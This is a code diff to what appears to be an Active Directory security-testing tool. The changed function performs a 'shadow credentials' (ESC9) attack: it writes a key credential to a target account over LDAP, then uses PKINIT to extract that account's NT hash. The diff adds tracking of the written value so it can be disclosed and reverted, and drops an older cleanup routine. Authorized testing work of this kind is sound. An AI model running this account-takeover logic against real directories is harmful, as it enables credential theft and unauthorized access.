@@ -7,16 +7,26 @@ from dataclasses import dataclass
 from typing import Optional
 
 from adscan_internal import telemetry
-from adscan_internal.rich_output import print_info, print_success, print_warning
+from adscan_internal.rich_output import print_info, print_success
 from adscan_internal.services.ldap_transport_service import ADscanLDAPConfig, ADscanLDAPConnection
 from adscan_core.rich_output import print_exception
 
 
 @dataclass
 class ShadowCredsResult:
+    """Outcome of :func:`add_shadow_credentials_native`.
+
+    ``added_key_credential_value`` is set as soon as the key credential was
+    written, INDEPENDENT of ``success``: a write followed by a PKINIT failure
+    still leaves the value on the account, and the caller must disclose and
+    revert it.
+    """
+
     success: bool
     nt_hash: Optional[str] = None
     error: Optional[str] = None
+    added_key_credential_value: Optional[str] = None
+    target_dn: Optional[str] = None
 
 
 def add_shadow_credentials_native(
@@ -38,6 +48,8 @@ def add_shadow_credentials_native(
     except Exception as exc:
         return ShadowCredsResult(success=False, error=f"Import error: {exc}")
 
+    added_value: Optional[str] = None
+    target_dn: Optional[str] = None
     try:
         cfg = ADscanLDAPConfig(
             domain=domain,
@@ -74,7 +86,8 @@ def add_shadow_credentials_native(
             key_credential = KeyCredential.generate_self_signed_certificate(
                 cert_subject or "adscan-shadow"
             )
-            current_keys.append(key_credential.toDNWithBinary2String(target_dn))
+            new_value = key_credential.toDNWithBinary2String(target_dn)
+            current_keys.append(new_value)
             if not conn.modify(
                 target_dn,
                 {"msDS-KeyCredentialLink": [("replace", current_keys)]},
@@ -83,6 +96,7 @@ def add_shadow_credentials_native(
                     success=False,
                     error="LDAP modify of msDS-KeyCredentialLink failed",
                 )
+            added_value = new_value
 
         # PKINIT to get NT hash
         pfx_b64 = urllib.parse.quote(
@@ -99,55 +113,26 @@ def add_shadow_credentials_native(
         for principal, nt_hash in ticketutil.get_NT_from_PAC(client.pkinit_tkey, decrypted):
             if str(nt_hash or "").strip():
                 print_success(f"ESC9: shadow credentials → NT hash obtained for {principal}")
-                return ShadowCredsResult(success=True, nt_hash=str(nt_hash).strip())
+                return ShadowCredsResult(
+                    success=True,
+                    nt_hash=str(nt_hash).strip(),
+                    added_key_credential_value=added_value,
+                    target_dn=target_dn,
+                )
 
         return ShadowCredsResult(
             success=False,
             error="PKINIT succeeded but no NT hash extracted from PAC",
+            added_key_credential_value=added_value,
+            target_dn=target_dn,
         )
 
     except Exception as exc:
         telemetry.capture_exception(exc)
         print_exception(exception=exc)
-        return ShadowCredsResult(success=False, error=f"{type(exc).__name__}: {exc}")
-
-
-def remove_shadow_credentials_native(
-    *,
-    dc_ip: str,
-    domain: str,
-    username: str,
-    password: str,
-    target_account: str,
-) -> bool:
-    """Clear msDS-KeyCredentialLink on target_account.
-
-    Synchronous — call via ``asyncio.to_thread`` from async contexts.
-    Returns True on success.
-    """
-    try:
-        cfg = ADscanLDAPConfig(
-            domain=domain,
-            dc_ip=dc_ip,
-            use_ldaps=False,
-            use_kerberos=False,
-            username=username,
-            password=password,
+        return ShadowCredsResult(
+            success=False,
+            error=f"{type(exc).__name__}: {exc}",
+            added_key_credential_value=added_value,
+            target_dn=target_dn,
         )
-        with ADscanLDAPConnection(cfg) as conn:
-            conn.search(
-                search_base=conn.domain_dn,
-                search_filter=f"(sAMAccountName={target_account})",
-                attributes=["distinguishedName"],
-            )
-            if not conn.entries:
-                print_warning(f"ESC9 cleanup: account {target_account!r} not found — skipping")
-                return True
-            target_dn = conn.entries[0].dn
-            return bool(
-                conn.modify(target_dn, {"msDS-KeyCredentialLink": [("replace", [])]})
-            )
-    except Exception as exc:
-        telemetry.capture_exception(exc)
-        print_exception(exception=exc)
-        return False
